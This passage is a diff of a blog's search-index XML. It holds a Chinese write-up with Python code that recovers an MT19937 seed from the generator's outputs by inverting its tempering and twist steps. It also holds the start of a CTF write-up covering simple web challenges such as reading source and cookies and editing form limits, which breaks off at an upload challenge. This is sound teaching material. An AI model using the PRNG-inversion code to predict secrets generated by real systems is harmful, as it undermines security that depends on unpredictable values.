bit</span></span><br><span class="line">        res = tmp&amp;high</span><br><span class="line">        <span class="comment"># recover other 31 bits,when i =0,it just use the method again it so beautiful!!!!</span></span><br><span class="line">        tmp = state[i-<span class="number">1</span>]^state[(i+<span class="number">396</span>)%<span class="number">624</span>]</span><br><span class="line">        <span class="comment"># recover Y,tmp = Y</span></span><br><span class="line">        <span class="keyword">if</span> tmp &amp; high == high:</span><br><span class="line">            tmp ^= mask</span><br><span class="line">            tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">            tmp |= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp &lt;&lt;=<span class="number">1</span></span><br><span class="line">        res |= (tmp)&amp;low</span><br><span class="line">        state[i] = res    </span><br><span class="line">    <span class="keyword">return</span> state</span><br></pre></td></tr></table></figure>
+<p>这里的问题就出在<code>if tmp &amp; high == high:</code>这个条件判断已经失效，不能据此判定tmp的准确值。</p>
+<p>一个简便的做法是枚举<code>mt[N - 1]</code>的四种可能，然后由于<code>mt[i - 1] ^ mt[i - 1] &gt;&gt; 30</code>可逆，而且因为$F$是奇数，与<code>2 ** 32</code> 必定互质，因此可以通过求$F$的逆元来倒推seed。</p>
+<p>检验这四个seed的方式就是用seed再重新生成几个随机数，与输入比对即可。</p>
+<h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_int32</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="number">0xFFFFFFFF</span> &amp; x)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">mt19937</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed=<span class="number">0</span></span>):<span class="comment"># magic method (run code below automatically when an object is created) </span></span><br><span class="line">        self.mt = [<span class="number">0</span>] * N</span><br><span class="line">        self.mt[<span class="number">0</span>] = seed</span><br><span class="line">        self.mti = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, N):</span><br><span class="line">            self.mt[i] = _int32(F * (self.mt[i - <span class="number">1</span>] ^ self.mt[i - <span class="number">1</span>] &gt;&gt; <span class="number">30</span>) + i)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getstate</span>(<span class="params">self,op=<span class="literal">False</span></span>):</span><br><span class="line">        <span class="keyword">if</span> self.mti == <span class="number">0</span> <span class="keyword">and</span> op==<span class="literal">False</span>:</span><br><span class="line">            self.twist()</span><br><span class="line">        y = self.mt[self.mti]</span><br><span class="line">        y = y ^ y &gt;&gt; U</span><br><span class="line">        y = y ^ y &lt;&lt; S &amp; B</span><br><span class="line">        y = y ^ y &lt;&lt; T &amp; C</span><br><span class="line">        y = y ^ y &gt;&gt; L</span><br><span class="line">        self.mti = (self.mti + <span class="number">1</span>) % N</span><br><span class="line">        <span class="keyword">return</span> _int32(y)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">twist</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, N):</span><br><span class="line">            y = _int32((self.mt[i] &amp; <span class="number">0x80000000</span>) + (self.mt[(i + <span class="number">1</span>) % N] &amp; <span class="number">0x7fffffff</span>))</span><br><span class="line">            self.mt[i] = (y &gt;&gt; <span class="number">1</span>) ^ self.mt[(i + M) % N]</span><br><span class="line">            <span class="keyword">if</span> y % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">                self.mt[i] = self.mt[i] ^ A</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inverse_right</span>(<span class="params">self,res, shift, mask=<span class="number">0xffffffff</span>, bits=<span class="number">32</span></span>):</span><br><span class="line">        tmp = res</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">            tmp = res ^ tmp &gt;&gt; shift &amp; mask</span><br><span class="line">        <span class="keyword">return</span> tmp</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inverse_left</span>(<span class="params">self,res, shift, mask=<span class="number">0xffffffff</span>, bits=<span class="number">32</span></span>):</span><br><span class="line">        tmp = res</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">            tmp = res ^ tmp &lt;&lt; shift &amp; mask</span><br><span class="line">        <span class="keyword">return</span> tmp</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extract_number</span>(<span class="params">self,y</span>): <span class="comment"># namely &quot;temper&quot; in Mivik&#x27;s code</span></span><br><span class="line">        y = y ^ y &gt;&gt; U</span><br><span class="line">        y = y ^ y &lt;&lt; S &amp; B</span><br><span class="line">        y = y ^ y &lt;&lt; T &amp; C</span><br><span class="line">        y = y ^ y &gt;&gt; L</span><br><span class="line">        <span class="keyword">return</span> y&amp;<span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">recover</span>(<span class="params">self,y</span>): <span class="comment"># inverse of extract_number</span></span><br><span class="line">        y = self.inverse_right(y,L)</span><br><span class="line">        y = self.inverse_left(y,T,C)</span><br><span class="line">        y = self.inverse_left(y,S,B)</span><br><span class="line">        y = self.inverse_right(y,U)</span><br><span class="line">        <span class="keyword">return</span> y&amp;<span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setstate</span>(<span class="params">self,s</span>): <span class="comment"># N generated random numbers -&gt; mt[] after twisting </span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(s)!=N):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;The length of prediction must be N!&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">            self.mt[i]=self.recover(s[i])</span><br><span class="line">        <span class="comment">#self.mt=s</span></span><br><span class="line">        self.mti=<span class="number">0</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27; </span></span><br><span class="line"><span class="string">    def predict(self,s): # a method to predict other pseudo random numbers after given N of them (useless in this problem)</span></span><br><span class="line"><span class="string">        self.setstate(s)</span></span><br><span class="line"><span class="string">        self.twist()</span></span><br><span class="line"><span class="string">        return self.getstate(True)</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">invtwist</span>(<span class="params">self</span>): <span class="comment"># mt[] after twisting -&gt; 4 possible values of mt[-1] before twisting</span></span><br><span class="line">        high = <span class="number">0x80000000</span></span><br><span class="line">        low = <span class="number">0x7fffffff</span></span><br><span class="line">        mask = A</span><br><span class="line">        opt = [<span class="number">0</span>] * <span class="number">4</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N-<span class="number">1</span>,N-<span class="number">2</span>,-<span class="number">1</span>): <span class="comment"># only process the last number</span></span><br><span class="line">            <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                    tmp = self.mt[i]^self.mt[(i+M)%N]</span><br><span class="line">                    <span class="keyword">if</span> s==<span class="number">0</span>: <span class="comment"># two possibilities</span></span><br><span class="line">                        tmp ^= mask</span><br><span class="line">                        tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">                        tmp |= <span class="number">1</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        tmp &lt;&lt;=<span class="number">1</span></span><br><span class="line">                    res = tmp&amp;high</span><br><span class="line">                    tmp = self.mt[i-<span class="number">1</span>]^self.mt[(i+M-<span class="number">1</span>)%N]</span><br><span class="line">                    <span class="keyword">if</span> t==<span class="number">0</span>: <span class="comment"># another two</span></span><br><span class="line">                        tmp ^= mask</span><br><span class="line">                        tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">                        tmp |= <span class="number">1</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        tmp &lt;&lt;=<span class="number">1</span></span><br><span class="line">                    res |= (tmp)&amp;low</span><br><span class="line">                    opt[s * <span class="number">2</span> + t] = res</span><br><span class="line">        <span class="keyword">return</span> opt</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">recover_seed</span>(<span class="params">self,last</span>): <span class="comment"># mt[-1] -&gt; mt[0]</span></span><br><span class="line">        n = <span class="number">1</span> &lt;&lt; <span class="number">32</span></span><br><span class="line">        inv = invert(F, n) <span class="comment"># inverse of F mod 2 ^ 32</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N-<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            last = ((last - i) * inv) % n</span><br><span class="line">            last = self.inverse_right(last, <span class="number">30</span>)</span><br><span class="line">        <span class="keyword">return</span> last</span><br><span class="line"></span><br><span class="line">N, M, A, U, S, B, T, C, L, F = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())</span><br><span class="line">inpt = [<span class="number">0</span>] * N <span class="comment"># align enough space</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (N):</span><br><span class="line">    inpt[i] = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">D = mt19937() </span><br><span class="line">D.setstate(inpt) <span class="comment"># using the input to recover state after twisting</span></span><br><span class="line">op = D.invtwist() <span class="comment"># generate four possibilities of D.mt[-1]</span></span><br><span class="line">seed = [<span class="number">0</span>] * <span class="number">4</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>): <span class="comment"># check the seeds one by one</span></span><br><span class="line">    seed[i] = D.recover_seed(op[i]) </span><br><span class="line">    E = mt19937(seed[i])</span><br><span class="line">    E.getstate() <span class="comment"># another psuedo random number generator</span></span><br><span class="line">    flag = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>): <span class="comment"># compare first 10 numbers is totally enough </span></span><br><span class="line">        <span class="keyword">if</span> E.extract_number(E.mt[j]) != inpt[j]:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> flag &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(seed[i])</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>时间复杂度$ O(N) $。</p>
+]]></content>
+      <categories>
+        <category>OI</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+        <tag>crypto</tag>
+      </tags>
   </entry>
   <entry>
     <title>博客域名变更小记</title>
@@ -1605,32 +1562,6 @@
       </categories>
       <tags>
         <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>广义mt19937随机数逆向</title>
-    <url>/2022/01/22/mt19937_expand.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="题意简述"><a href="#题意简述" class="headerlink" title="题意简述"></a>题意简述</h1><p>给出mt19937中的10个参数$ N、M、A、U、S、B、T、C、L、F $，并给出<strong>刚刚生成</strong>的前$ N $个伪随机数，求出伪随机数对应的种子seed。</p>
-<span id="more"></span>
-<h1 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h1><h2 id="20pts"><a href="#20pts" class="headerlink" title="20pts"></a>20pts</h2><p>暴力枚举seed即可，代码略。</p>
-<h2 id="100pts"><a href="#100pts" class="headerlink" title="100pts"></a>100pts</h2><p>做法的大致思路是：生成的随机数→<code>twist</code>后的<code>state</code>→<code>twist</code>前可能的<code>state[-1]</code>→求得seed</p>
-<p>我们先考虑标准情况，也就是参数与论文完全一致的时候，这里有一篇<a href="http://blog.tolinchan.xyz/2021/07/27/%E6%A2%85%E6%A3%AE%E6%97%8B%E8%BD%AC%E7%AE%97%E6%B3%95%E7%A0%94%E7%A9%B6/">现成的题解</a>。</p>
-<p>具体原理这里就不阐释了，给的链接和<a href="https://mivik.gitee.io/2020/solution/mivik-newbie-and-chinos-contest-2020-solution-amegura/">Mivik的题解</a>叙述得很清楚。</p>
-<p>然后当$A$的首位不为1时，就不能直接通过<code>tmp</code>的首位判断原来的<code>tmp</code>是不是奇数了。</p>
-<p>原题解中逆向<code>twist</code>的代码如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">backtrace</span>(<span class="params">cur</span>):</span><br><span class="line">    high = <span class="number">0x80000000</span></span><br><span class="line">    low = <span class="number">0x7fffffff</span></span><br><span class="line">    mask = <span class="number">0x9908b0df</span></span><br><span class="line">    state = cur</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">623</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        tmp = state[i]^state[(i+<span class="number">397</span>)%<span class="number">624</span>]</span><br><span class="line">        <span class="comment"># recover Y,tmp = Y</span></span><br><span class="line">        <span class="keyword">if</span> tmp &amp; high == high:</span><br><span class="line">            tmp ^= mask</span><br><span class="line">            tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">            tmp |= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp &lt;&lt;=<span class="number">1</span></span><br><span class="line">        <span class="comment"># recover highest bit</span></span><br><span class="line">        res = tmp&amp;high</span><br><span class="line">        <span class="comment"># recover other 31 bits,when i =0,it just use the method again it so beautiful!!!!</span></span><br><span class="line">        tmp = state[i-<span class="number">1</span>]^state[(i+<span class="number">396</span>)%<span class="number">624</span>]</span><br><span class="line">        <span class="comment"># recover Y,tmp = Y</span></span><br><span class="line">        <span class="keyword">if</span> tmp &amp; high == high:</span><br><span class="line">            tmp ^= mask</span><br><span class="line">            tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">            tmp |= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp &lt;&lt;=<span class="number">1</span></span><br><span class="line">        res |= (tmp)&amp;low</span><br><span class="line">        state[i] = res    </span><br><span class="line">    <span class="keyword">return</span> state</span><br></pre></td></tr></table></figure>
-<p>这里的问题就出在<code>if tmp &amp; high == high:</code>这个条件判断已经失效，不能据此判定tmp的准确值。</p>
-<p>一个简便的做法是枚举<code>mt[N - 1]</code>的四种可能，然后由于<code>mt[i - 1] ^ mt[i - 1] &gt;&gt; 30</code>可逆，而且因为$F$是奇数，与<code>2 ** 32</code> 必定互质，因此可以通过求$F$的逆元来倒推seed。</p>
-<p>检验这四个seed的方式就是用seed再重新生成几个随机数，与输入比对即可。</p>
-<h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_int32</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="number">0xFFFFFFFF</span> &amp; x)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">mt19937</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed=<span class="number">0</span></span>):<span class="comment"># magic method (run code below automatically when an object is created) </span></span><br><span class="line">        self.mt = [<span class="number">0</span>] * N</span><br><span class="line">        self.mt[<span class="number">0</span>] = seed</span><br><span class="line">        self.mti = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, N):</span><br><span class="line">            self.mt[i] = _int32(F * (self.mt[i - <span class="number">1</span>] ^ self.mt[i - <span class="number">1</span>] &gt;&gt; <span class="number">30</span>) + i)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getstate</span>(<span class="params">self,op=<span class="literal">False</span></span>):</span><br><span class="line">        <span class="keyword">if</span> self.mti == <span class="number">0</span> <span class="keyword">and</span> op==<span class="literal">False</span>:</span><br><span class="line">            self.twist()</span><br><span class="line">        y = self.mt[self.mti]</span><br><span class="line">        y = y ^ y &gt;&gt; U</span><br><span class="line">        y = y ^ y &lt;&lt; S &amp; B</span><br><span class="line">        y = y ^ y &lt;&lt; T &amp; C</span><br><span class="line">        y = y ^ y &gt;&gt; L</span><br><span class="line">        self.mti = (self.mti + <span class="number">1</span>) % N</span><br><span class="line">        <span class="keyword">return</span> _int32(y)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">twist</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, N):</span><br><span class="line">            y = _int32((self.mt[i] &amp; <span class="number">0x80000000</span>) + (self.mt[(i + <span class="number">1</span>) % N] &amp; <span class="number">0x7fffffff</span>))</span><br><span class="line">            self.mt[i] = (y &gt;&gt; <span class="number">1</span>) ^ self.mt[(i + M) % N]</span><br><span class="line">            <span class="keyword">if</span> y % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">                self.mt[i] = self.mt[i] ^ A</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inverse_right</span>(<span class="params">self,res, shift, mask=<span class="number">0xffffffff</span>, bits=<span class="number">32</span></span>):</span><br><span class="line">        tmp = res</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">            tmp = res ^ tmp &gt;&gt; shift &amp; mask</span><br><span class="line">        <span class="keyword">return</span> tmp</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inverse_left</span>(<span class="params">self,res, shift, mask=<span class="number">0xffffffff</span>, bits=<span class="number">32</span></span>):</span><br><span class="line">        tmp = res</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">            tmp = res ^ tmp &lt;&lt; shift &amp; mask</span><br><span class="line">        <span class="keyword">return</span> tmp</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extract_number</span>(<span class="params">self,y</span>): <span class="comment"># namely &quot;temper&quot; in Mivik&#x27;s code</span></span><br><span class="line">        y = y ^ y &gt;&gt; U</span><br><span class="line">        y = y ^ y &lt;&lt; S &amp; B</span><br><span class="line">        y = y ^ y &lt;&lt; T &amp; C</span><br><span class="line">        y = y ^ y &gt;&gt; L</span><br><span class="line">        <span class="keyword">return</span> y&amp;<span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">recover</span>(<span class="params">self,y</span>): <span class="comment"># inverse of extract_number</span></span><br><span class="line">        y = self.inverse_right(y,L)</span><br><span class="line">        y = self.inverse_left(y,T,C)</span><br><span class="line">        y = self.inverse_left(y,S,B)</span><br><span class="line">        y = self.inverse_right(y,U)</span><br><span class="line">        <span class="keyword">return</span> y&amp;<span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setstate</span>(<span class="params">self,s</span>): <span class="comment"># N generated random numbers -&gt; mt[] after twisting </span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(s)!=N):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;The length of prediction must be N!&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">            self.mt[i]=self.recover(s[i])</span><br><span class="line">        <span class="comment">#self.mt=s</span></span><br><span class="line">        self.mti=<span class="number">0</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27; </span></span><br><span class="line"><span class="string">    def predict(self,s): # a method to predict other pseudo random numbers after given N of them (useless in this problem)</span></span><br><span class="line"><span class="string">        self.setstate(s)</span></span><br><span class="line"><span class="string">        self.twist()</span></span><br><span class="line"><span class="string">        return self.getstate(True)</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">invtwist</span>(<span class="params">self</span>): <span class="comment"># mt[] after twisting -&gt; 4 possible values of mt[-1] before twisting</span></span><br><span class="line">        high = <span class="number">0x80000000</span></span><br><span class="line">        low = <span class="number">0x7fffffff</span></span><br><span class="line">        mask = A</span><br><span class="line">        opt = [<span class="number">0</span>] * <span class="number">4</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N-<span class="number">1</span>,N-<span class="number">2</span>,-<span class="number">1</span>): <span class="comment"># only process the last number</span></span><br><span class="line">            <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                    tmp = self.mt[i]^self.mt[(i+M)%N]</span><br><span class="line">                    <span class="keyword">if</span> s==<span class="number">0</span>: <span class="comment"># two possibilities</span></span><br><span class="line">                        tmp ^= mask</span><br><span class="line">                        tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">                        tmp |= <span class="number">1</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        tmp &lt;&lt;=<span class="number">1</span></span><br><span class="line">                    res = tmp&amp;high</span><br><span class="line">                    tmp = self.mt[i-<span class="number">1</span>]^self.mt[(i+M-<span class="number">1</span>)%N]</span><br><span class="line">                    <span class="keyword">if</span> t==<span class="number">0</span>: <span class="comment"># another two</span></span><br><span class="line">                        tmp ^= mask</span><br><span class="line">                        tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">                        tmp |= <span class="number">1</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        tmp &lt;&lt;=<span class="number">1</span></span><br><span class="line">                    res |= (tmp)&amp;low</span><br><span class="line">                    opt[s * <span class="number">2</span> + t] = res</span><br><span class="line">        <span class="keyword">return</span> opt</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">recover_seed</span>(<span class="params">self,last</span>): <span class="comment"># mt[-1] -&gt; mt[0]</span></span><br><span class="line">        n = <span class="number">1</span> &lt;&lt; <span class="number">32</span></span><br><span class="line">        inv = invert(F, n) <span class="comment"># inverse of F mod 2 ^ 32</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N-<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            last = ((last - i) * inv) % n</span><br><span class="line">            last = self.inverse_right(last, <span class="number">30</span>)</span><br><span class="line">        <span class="keyword">return</span> last</span><br><span class="line"></span><br><span class="line">N, M, A, U, S, B, T, C, L, F = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())</span><br><span class="line">inpt = [<span class="number">0</span>] * N <span class="comment"># align enough space</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (N):</span><br><span class="line">    inpt[i] = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">D = mt19937() </span><br><span class="line">D.setstate(inpt) <span class="comment"># using the input to recover state after twisting</span></span><br><span class="line">op = D.invtwist() <span class="comment"># generate four possibilities of D.mt[-1]</span></span><br><span class="line">seed = [<span class="number">0</span>] * <span class="number">4</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>): <span class="comment"># check the seeds one by one</span></span><br><span class="line">    seed[i] = D.recover_seed(op[i]) </span><br><span class="line">    E = mt19937(seed[i])</span><br><span class="line">    E.getstate() <span class="comment"># another psuedo random number generator</span></span><br><span class="line">    flag = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>): <span class="comment"># compare first 10 numbers is totally enough </span></span><br><span class="line">        <span class="keyword">if</span> E.extract_number(E.mt[j]) != inpt[j]:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> flag &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(seed[i])</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-<p>时间复杂度$ O(N) $。</p>
-]]></content>
-      <categories>
-        <category>OI</category>
-      </categories>
-      <tags>
-        <tag>python</tag>
-        <tag>crypto</tag>
       </tags>
   </entry>
   <entry>
@@ -1930,6 +1861,58 @@
       </tags>
   </entry>
   <entry>
+    <title>四川大学CTF实训杯wp</title>
+    <url>/2022/07/21/easiestctf.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>就是课上讲的那点东西，比我一年前备战校测的内容还要简单。</p>
+<span id="more"></span>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Easy-Flag"><a href="#Easy-Flag" class="headerlink" title="Easy_Flag"></a>Easy_Flag</h3><p>ctrl+u，查看源代码：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;&quot;</span> <span class="attr">content</span>=<span class="string">&quot;&quot;</span>  <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">空空如也～</span><br><span class="line"><span class="comment">&lt;!--flag.php--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">oncontextmenu</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        event.<span class="property">returnValue</span> = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(<span class="string">&#x27;想看代码？&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">onkeydown</span> = <span class="variable language_">document</span>.<span class="property">onkeyup</span> = <span class="variable language_">document</span>.<span class="property">onkeypress</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> e = event || <span class="variable language_">window</span>.<span class="property">event</span> || <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>.<span class="property">arguments</span>[<span class="number">0</span>];</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (e &amp;&amp; e.<span class="property">keyCode</span> == <span class="number">123</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            e.<span class="property">returnValue</span> = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">&#x27;没想到吧，这也不行？&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>按照提示查看/flag.php即可。</p>
+<h3 id="Easy-Button"><a href="#Easy-Button" class="headerlink" title="Easy_Button"></a>Easy_Button</h3><p>f12将<code>maxlength</code>改为50，hackbar里面随便post一个手机号。</p>
+<p>如<code>phone=12312312312</code></p>
+<h3 id="Easy-Browser"><a href="#Easy-Browser" class="headerlink" title="Easy_Browser"></a>Easy_Browser</h3><p>查看源码：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    页面什么也没有</span><br><span class="line">    <span class="comment">&lt;!--看看cookie里有什么--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>按照提示查看cookie</p>
+<p><img src="/2022/07/21/easiestctf/1.png"></p>
+<p>访问/get.php，要求提交一个参数名为flag，参数值为1的数据。</p>
+<p><code>/get.php?flag=1</code></p>
+<h3 id="旋转的木马"><a href="#旋转的木马" class="headerlink" title="旋转的木马"></a>旋转的木马</h3><p>盲猜upload.php，发现提供了上传图片的按钮。</p>
